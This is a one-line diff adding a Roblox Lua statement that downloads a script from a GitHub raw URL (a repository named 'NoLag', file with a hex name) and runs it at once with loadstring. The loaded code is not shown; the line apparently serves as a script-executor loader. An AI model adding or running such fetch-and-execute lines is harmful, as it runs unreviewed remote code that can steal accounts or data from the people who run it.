@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RolboxLatino/NoLag/refs/heads/main/6f881a2ad57fef831a8a846a5de51190.txt"))()
